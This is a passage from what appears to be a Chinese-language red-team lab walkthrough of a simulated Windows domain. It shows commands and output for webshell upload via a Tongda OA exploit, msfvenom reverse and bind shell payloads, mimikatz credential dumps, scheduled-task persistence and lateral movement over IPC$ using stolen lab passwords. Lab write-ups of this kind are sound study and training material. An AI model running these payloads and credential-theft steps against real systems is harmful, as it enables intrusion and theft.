Mask:255.255.255.0</span><br></pre></td></tr></table></figure><p>算了，还是直接上传linenum，直接扫吧</p><p>发现域名：<a href="http://www.rebootuser.com">www.rebootuser.com</a></p><p>系统内核：Linux ubuntu 4.4.0-142-generic （脏牛：&gt;=2.6.22）Ubuntu 14.04.6 LTS（这个好像有漏洞）</p><p>因为之前写了一个用户，所以知道</p><ul><li>ubuntu</li><li>jeff / abc123</li></ul><p>计划任务</p><ul><li>/etc/crontab</li><li>/etc/cron.daily</li><li>/etc/cron.d</li></ul><p>nameserver 192.168.52.2</p><p>端口：22（ssh） 631（？） 8000（docker）</p><p>历史记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2018-12613</span><br><span class="line">ls</span><br><span class="line">cd phpmyadmin/</span><br><span class="line"></span><br><span class="line">redis-2.8.17</span><br></pre></td></tr></table></figure><h2 id="写ssh密钥"><a class="markdownIt-Anchor" href="#写ssh密钥"></a> 写ssh密钥</h2><p>下载配置文件：<code>/etc/ssh/sshd_config</code>里面的配置，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">#AuthorizedKeysFile%h/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>这不行，需要把最后一个给注释掉，然后把我们的密钥写上（已经上传）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat red_team_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line"># 重启</span><br><span class="line">service ssh restart</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714155117566.png" alt="image-20230714155117566" /></p><p>好像还是不行，我们添加用户就以这台主机打吧</p><h2 id="上传fscan扫内网"><a class="markdownIt-Anchor" href="#上传fscan扫内网"></a> 上传fscan扫内网</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.52.1/24 -o result.txt</span><br><span class="line">./fscan_amd64 -h 192.168.93.1/24 -o 93fs.txt</span><br><span class="line">(icmp) Target 192.168.93.10   is alive</span><br><span class="line">(icmp) Target 192.168.93.20   is alive</span><br><span class="line">(icmp) Target 192.168.93.30   is alive</span><br><span class="line">(icmp) Target 192.168.93.40   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">192.168.93.30:139 open</span><br><span class="line">192.168.93.20:139 open</span><br><span class="line">192.168.93.40:135 open</span><br><span class="line">192.168.93.30:135 open</span><br><span class="line">192.168.93.20:135 open</span><br><span class="line">192.168.93.10:22 open</span><br><span class="line">192.168.93.40:445 open</span><br><span class="line">192.168.93.30:445 open</span><br><span class="line">192.168.93.20:445 open</span><br><span class="line">192.168.93.40:139 open</span><br><span class="line">192.168.93.20:8080 open</span><br><span class="line">192.168.93.10:8000 open</span><br><span class="line">192.168.93.30:88 open</span><br><span class="line">192.168.93.20:1099 open</span><br><span class="line">[*] alive ports len is: 14</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.93.30</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]192.168.93.30</span><br><span class="line">[*] NetBios: 192.168.93.30   [+]DC DC.whoamianony.org            Windows Server 2012 R2 Datacenter 9600 </span><br><span class="line">[+] 192.168.93.40       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[+] 192.168.93.30       MS17-010        (Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">[*] NetBios: 192.168.93.40   PC2.whoamianony.org                 Windows 7 Professional 7601 Service Pack 1 </span><br><span class="line">[+] 192.168.93.20       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://192.168.93.20:8080 code:200 len:10065  title:通达OA网络智能办公系统</span><br><span class="line">[+] InfoScan:http://192.168.93.20:8080 [通达OA] </span><br><span class="line">[+] http://192.168.93.20:8080 tongda-user-session-disclosure </span><br><span class="line">[*] WebTitle: http://192.168.93.10:8000 code:200 len:17474  title:Laravel</span><br></pre></td></tr></table></figure><p>有四台主机，其中，3台可以用ms17-010，能不能用成功是另外一回事了，先打通达OA那台主机</p><h1 id="pc-1"><a class="markdownIt-Anchor" href="#pc-1"></a> PC-1</h1><p>设置http代理后，我们可以访问网页：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721100733862.png" alt="image-20230721100733862" /></p><p>先试试ms17-010吧，如果能打进去就好了。用proxychain代理另一个msf（虽然可以添加路由，但是session经常断，还是frp好用）</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721101735016.png" alt="image-20230721101735016" /></p><p>不行，那就通达OA漏洞冲。</p><p>访问：<a href="http://192.168.52.30:8080/ispirit/login_code.php">http://192.168.52.30:8080/ispirit/login_code.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;codeuid&quot;:&quot;&#123;F8C47480-79AC-099A-23E5-51593824A37E&#125;&quot;,&quot;authcode&quot;:&quot;LOGIN_CODEf792IO1xwD6Q4V7CHsuypdP2suN41iyt3d48vRzGFr04F8vjQO+gWBgQzVUeO0h0MXBPWDz3UwFDGcfEmFm8e2R\/uLGwlgDJen0kNggrKUGP0cCsh9PJzmS\/Qucx6rAzPniW\/vXiINWtGO1QGnj5r9J9cKsY&quot;&#125;</span><br></pre></td></tr></table></figure><p>访问：<a href="http://192.168.52.30:8080//logincheck_code.php">http://192.168.52.30:8080//logincheck_code.php</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721104536431.png" alt="image-20230721104536431" /></p><p>更改对应：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721105246123.png" alt="image-20230721105246123" /></p><p>访问：<a href="http://192.168.52.30:8080/general/index.php?isIE=0&amp;modify_pwd=0%EF%BC%8C%E5%A1%AB%E4%B8%8A%E5%AF%B9%E5%BA%94%E7%9A%84COOKIE%EF%BC%8C%E7%BB%95%E8%BF%87%EF%BC%9A">http://192.168.52.30:8080/general/index.php?isIE=0&amp;modify_pwd=0，填上对应的COOKIE，绕过：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: PHPSESSID=h1eha4jn67kshkshaq58m5f8k3; path=/</span><br></pre></td></tr></table></figure><p>失败了，emmmm，仔细看了一下：<strong>前台通过遍历UID找到在线的人员后，获取phpsession后即可登录</strong>，好把，我先登录～因为是遍历，难怪我弄不成功。</p><p>使用脚本：<a href="https://github.com/z1un/TongdaOA-exp%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%A5%BDshell%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%B0%E8%9D%8E%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%BF%9E%E4%B8%8A">https://github.com/z1un/TongdaOA-exp，上传好shell，然后冰蝎设置代理连上</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721110846926.png" alt="image-20230721110846926" /></p><p>然后上线msf，发现它能ping我们，也就是能连外网，冲</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111244409.png" alt="image-20230721111244409" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111757397.png" alt="image-20230721111757397" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111822064.png" alt="image-20230721111822064" /></p><p>下一步，信息搜集+提权+权限维持+横向移动</p><p>发现：php/meterpreter/reverse_tcp对于meterpreter的限制好大，没办法进入shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; route</span><br><span class="line">[-] The &quot;route&quot; command is not supported by this Meterpreter type (php/windows)</span><br></pre></td></tr></table></figure><p>赶紧上线一个exe吧，受不了了。上线成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">冰蝎上传：msfvenom -p windows/meterpreter/reverse_tcp lhost=10.131.210.172 lport=4706 -f exe -o 4706.exe</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721140617156.png" alt="image-20230721140617156" /></p><h2 id="信息搜集-3"><a class="markdownIt-Anchor" href="#信息搜集-3"></a> 信息搜集</h2><p>checklist：</p><ul><li>权限</li><li>架构/系统类型/补丁</li><li>哈希/密码/配置信息</li><li>网络信息/配置/网卡</li><li>端口/服务</li></ul><p>上面说到了，有3个网卡，之前fscan也扫到：192.168.93.30是DC，40是PC2。因为已经是system权限，所以不考虑提权，还是可以看看有什么可以用的漏洞，利用<code>post/windows/gather/enum_patches </code>模块 可以根据漏洞编号快速找出系统中缺少的补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HotFix ID  Install Date</span><br><span class="line">---------  ------------</span><br><span class="line">KB2534111  8/25/2019</span><br><span class="line">KB2999226  9/15/2019</span><br><span class="line">KB958488   8/29/2019</span><br><span class="line">KB976902   11/21/2010</span><br></pre></td></tr></table></figure><p>哈希信息的话，用Kiwi（操作<a href="https://blog.csdn.net/m0_53087192/article/details/112707016">参考</a>）抓一下：发现kiwi的只是支持86的，好废物（原来是我的Payload设置错了，需要设置成x64的），还是自己下载传上去吧。<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe sekurlsa::logonpasswords</span><br><span class="line">Authentication Id : 0 ; 1591357 (00000000:0018483d)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/21 9:22:02</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * LM       : 56b0cd8b125c05055e2dd9e955f18034</span><br><span class="line">         * NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line">         * SHA1     : 2bc4124300a6a8fc0ca10891823d36c64e4b3a40</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1243251 (00000000:0012f873)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : bunny</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/21 9:19:38</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-1112</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * LM       : 7de10bf327ef7f2ac6ebe8776a153feb</span><br><span class="line">         * NTLM     : cc567d5556030b7356ee4915ff098c8f</span><br><span class="line">         * SHA1     : 3747632756191e3350e53211c63f804eb163638f</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:10</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC1$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:10</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 3e6a3d8c713b4821eaa51aab25f52074</span><br><span class="line">         * SHA1     : d8e1318a24c64b8fcc89dc8609b09af50342bacf</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc1$</span><br><span class="line">         * Domain   : whoamianony.org</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 50236 (00000000:0000c43c)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:09</span><br><span class="line">SID               : </span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 3e6a3d8c713b4821eaa51aab25f52074</span><br><span class="line">         * SHA1     : d8e1318a24c64b8fcc89dc8609b09af50342bacf</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC1$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:09</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc1$</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a class="markdownIt-Anchor" href="#权限维持"></a> 权限维持</h2><p>使用任务：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721141149902.png" alt="image-20230721141149902" /></p><p>使用定时任务（<a href="https://blog.csdn.net/weixin_45677145/article/details/122061271">at / schtasks</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN sysRev2 /SC DAILY /ST 10:02 /TR C:\Windows\Temp\4706.exe /RL HIGHEST</span><br><span class="line"># 五分钟一次</span><br><span class="line">schtasks /create /sc minute /mo 5 /tn &quot;sysRev2&quot; /tr C:\Windows\Temp\4706.exe</span><br></pre></td></tr></table></figure><h2 id="横向"><a class="markdownIt-Anchor" href="#横向"></a> 横向</h2><p>因为尝试过对PC2和DC进行永恒之蓝攻击，没用，所以横向吧，哈哈哈哈。搜集到的信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Username : Administrator</span><br><span class="line">Domain   : WHOAMIANONY</span><br><span class="line">NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line">Password : Whoami2021</span><br><span class="line"></span><br><span class="line">#其他IP</span><br><span class="line">192.168.93.30 （DC）</span><br><span class="line">192.168.93.40</span><br><span class="line"></span><br><span class="line">#DNS</span><br><span class="line">whoamianony.org</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试ipc连接一下，这里竟然明文传递就可以了，行吧～</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.40\ipc$ &quot;Whoami2021&quot; /user:whoamianony.org\Administrator</span><br><span class="line">net use \\192.168.93.30\ipc$ &quot;Whoami2021&quot; /user:whoamianony.org\Administrator</span><br><span class="line"></span><br><span class="line">C:\Windows\Temp&gt;net use</span><br><span class="line">\192.168.93.30\ipc$      Microsoft Windows Network</span><br><span class="line">\\192.168.93.40\ipc$      Microsoft Windows Network</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721150954348.png" alt="image-20230721150954348" /></p><p>成功了。然后传个frp进去，准备打DC（虽然可以直接拿下，但是还是模拟一下三层吧）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy frpc.exe \\192.168.93.40\admin$</span><br><span class="line">copy frpc2.ini \\192.168.93.40\admin$</span><br><span class="line">copy frp.bat \\192.168.93.40\admin$</span><br><span class="line"></span><br><span class="line">at \\192.168.93.40 15:51 frp.bat </span><br><span class="line">at \\192.168.93.40 17:06 PC2.exe</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721152615512.png" alt="image-20230721152615512" /></p><p>传进去了，然后在我们的web2开启frps。添加proxychain</p><blockquote><p>具体的操作是，先搭好第一个隧道，然后默认配置移位到内网中，只是改一下frpc中的ip即可，其他都不用改</p></blockquote><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721162737931.png" alt="image-20230721162737931" /></p><p>可以看到，设置成功（虽然，其实，我们用不到，但不能没有！）</p><p>现在设置正向连接，传一个马进去，然后我们主机连他（因为它连不出来）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=4801 -f exe -o /home/j3fffff/Template/4801.exe</span><br><span class="line">copy 4801.bat \\192.168.93.40\admin$</span><br><span class="line">schtasks /Create /s 192.168.93.40 /TN sysRev2 /SC MINUTE /ST 11:05 /TR C:\Windows\4801.exe #用at或者impacket也行，后面有说道，运行后再加上服务也OK</span><br></pre></td></tr></table></figure><h1 id="pc2"><a class="markdownIt-Anchor" href="#pc2"></a> PC2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 PC2</span><br><span class="line">OS Name:                   Microsoft Windows 7 专业版 </span><br><span class="line">OS Version:                6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Member Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows 用户</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00371-177-0000061-85693</span><br><span class="line">Original Install Date:     2019/8/25, 9:54:10</span><br><span class="line">System Boot Time:          2023/7/26, 15:29:23</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware Virtual Platform</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 25 Model 116 Stepping 1 AuthenticAMD ~3792 Mhz</span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             zh-cn;Chinese (China)</span><br><span class="line">Input Locale:              zh-cn;Chinese (China)</span><br><span class="line">Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 1,267 MB</span><br><span class="line">Virtual Memory: Max Size:  4,095 MB</span><br><span class="line">Virtual Memory: Available: 3,236 MB</span><br><span class="line">Virtual Memory: In Use:    859 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    whoamianony.org</span><br><span class="line">Logon Server:              \\DC</span><br><span class="line">Hotfix(s):                 4 Hotfix(s) Installed.</span><br><span class="line">                           [01]: KB2534111</span><br><span class="line">                           [02]: KB2999226</span><br><span class="line">                           [03]: KB958488</span><br><span 